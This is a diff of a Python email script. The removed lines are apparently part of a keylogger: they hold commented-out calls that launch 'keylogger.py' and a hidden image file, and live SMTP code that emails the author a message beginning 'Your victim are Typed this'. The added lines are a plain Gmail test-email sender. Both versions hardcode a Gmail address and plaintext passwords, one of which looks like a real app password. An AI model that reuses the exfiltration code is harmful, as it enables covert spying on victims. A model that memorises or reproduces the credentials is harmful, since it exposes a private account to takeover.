@@ -1,35 +1,51 @@
-# for use send the mail 
-
 import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
-# call the subprocess
+# Email credentials
+sender_email = "mperarasu10@gmail.com"
+receiver_email = "mperarasu10@gmail.com"
+password = "bswltvlfmnhnckaa"
 
-import datetime, sys, subprocess
+# Email content
+subject = "Test Email"
+body = "This is a test email sent from Python."
 
-#from subprocess import call
+# Create a MIMEText object
+msg = MIMEMultipart()
+msg['From'] = sender_email
+msg['To'] = receiver_email
+msg['Subject'] = subject
 
+# Attach the body with the msg instance
+msg.attach(MIMEText(body, 'plain'))
 
-#File_name = sys.MEIPASS + "/ghost.jpg"
-#subprocess.Popen(File_name,shell=True)
-
-#def open_py_file():
-#    call(["python","keylogger.py"])
-
-#open_py_file()
-
-time = datetime.datetime.now().time().strftime("%I"":""%M"":""%S"",""%p")
-time = str(time)
-
-
-
+# SMTP server configuration
 smtp_server = "smtp.gmail.com"
-port = 587
-sender_email = "mperarasu10gmail.com"
-password = "PERARASUG2156$$$"
+port = 465  # For SSL
 
+# Create a secure SSL context
+print("Creating SSL context...")
+context = smtplib.ssl.create_default_context()
 
-server = smtplib.SMTP(smtp_server,port)
-server.starttls()
-server.login(sender_email,password)
-message = "\n \n Your victim are Typed this : " + time
-server.sendmail(sender_email,sender_email,message)
+try:
+    print("Connecting to the server...")
+    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
+        print("Connected to the server.")
+        
+        print("Logging in...")
+        server.login(sender_email, password)
+        print("Logged in successfully.")
+        
+        print("Sending email...")
+        server.sendmail(sender_email, receiver_email, msg.as_string())
+        print("Email sent successfully!")
+        
+except smtplib.SMTPConnectError:
+    print("Failed to connect to the server. Wrong server address or port.")
+except smtplib.SMTPAuthenticationError:
+    print("Failed to authenticate. Wrong email or password.")
+except smtplib.SMTPException as e:
+    print(f"SMTP error occurred: {e}")
+except Exception as e:
+    print(f"An error occurred: {e}")
